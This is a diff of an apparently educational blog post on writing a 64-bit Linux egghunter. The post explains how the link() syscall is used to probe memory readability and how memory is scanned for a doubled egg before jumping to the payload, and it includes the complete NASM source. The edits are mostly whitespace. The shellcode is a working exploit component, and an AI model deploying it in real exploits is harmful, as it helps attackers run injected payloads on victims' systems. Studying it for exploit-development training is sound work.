@@ -35,9 +35,9 @@ You may be thinking:
 + "Why do I need to know if the address is readable or not?"
 + "Why not just read/scan each byte of the memory space, regardless if it's readable or not?"  
 
-Well, if you try that, you will quickly discover that your egghunter crash the host program. To avoid crashing, we will discover readability by passing the memory address to link as the first argument `*oldpath`. For the second argument `*newpath` we will set that to 0.  
+Well, if you try that, you will quickly discover that your egghunter crash the host program. To avoid crashing, we will discover readability by passing the memory address to link as the first argument `*oldpath`. For the second argument `*newpath` we will set that to 0.   
 
-#### Assembly for our Link Function
+#### Assembly for our Link Function  
 
 ```asm
  lea rdi, [rdx+0x8]  ; ARG1=*oldpath
@@ -45,14 +45,14 @@ Well, if you try that, you will quickly discover that your egghunter crash the h
  xor rax, rax        ; reset rax for syscall
  add al, 0x56        ; System Call for link()
  syscall             ; Executes link()
-```  
+```    
 
-### Link() - Cannot Read Memory
-If the memory at the address in the `RDI` register is not readable, an error code will be returned in the rax register. After the system call, we will check for this error. If the error exists, then we will check the next memory page.
+### Link() - Cannot Read Memory  
+If the memory at the address in the `RDI` register is not readable, an error code will be returned in the rax register. After the system call, we will check for this error. If the error exists, then we will check the next memory page.  
 
-#### Next Memory Page Assembly
+#### Next Memory Page Assembly  
 
-```asm
+```asm  
 nextPage:            ; Increment RDX to the next memory page
  or dx, 0xfff        ; 0xfff = 4096. Size of page
 nextAddress:         ; Increment RDX to the next memory address
@@ -64,22 +64,22 @@ nextAddress:         ; Increment RDX to the next memory address
  syscall             ; Executes link()
  cmp al, 0xf2        ; Can memory address be read?
  jz nextPage         ; If no, check the next memory page
-```
+```  
 
 + The error for not being able to read the memory is `0xfffffffffffffff2`. Checking the last byte works just as good as checking all 8 bytes, and it also makes our shellcode length smaller.
 
 ### Check for the Egg
 If the memory is readable, then we will check to see if our egg exists at the memory location.
 
-```asm
+```asm  
  jz nextPage         ; If no, check the next memory page
  xor rbx, rbx
  add ebx, 0x50905090 ; Configure Egg in RBX
  cmp [rdx], ebx      ; Egg?
  jnz nextAddress     ; No Egg? Go to next memory page
-```  
+```   
 
-If the egg does not exist, then we will increase the memory address by 1 byte, and check again. We will continue scanning the memory space byte by byte, until either we find the egg or we cannot read the memory. If the memory is unreadable, we will check the next memory page by incrementing the address by 4096ish bytes. 
+If the egg does not exist, then we will increase the memory address by 1 byte and check again. We will continue scanning the memory space byte by byte, until either we find the egg or we cannot read the memory. If the memory is unreadable, we will check the next memory page by incrementing the address by 4096ish bytes. 
 
 ### Check for a Double Egg
 If the egg exists, we will see if there are two instances of our egg, or only one. If only one egg exists, then that is not the egg(s) we are looking for. In such a case of only 1 egg, we will keep our scan continuing. Although if our egg exists twice, we will jump to our eggs and execute our payload.
@@ -96,7 +96,7 @@ If the egg exists, we will see if there are two instances of our egg, or only on
 
 #### EggHunter Assembly
 
-```asm
+```asm  
 ; Filename: eggHunter.nasm
 ; Author:   boku
 global _start
@@ -136,7 +136,7 @@ nextAddress:         ; Increment RDX to the next memory address
  cmp [rdx+0x4], ebx  ; second Egg?
  jnz nextAddress     ; No Egg? Check next memory address
  jmp rdx             ; EGG FOUND! Jump to Egg!
-```
+```  
 
 ## Compiling the EggHunter
 
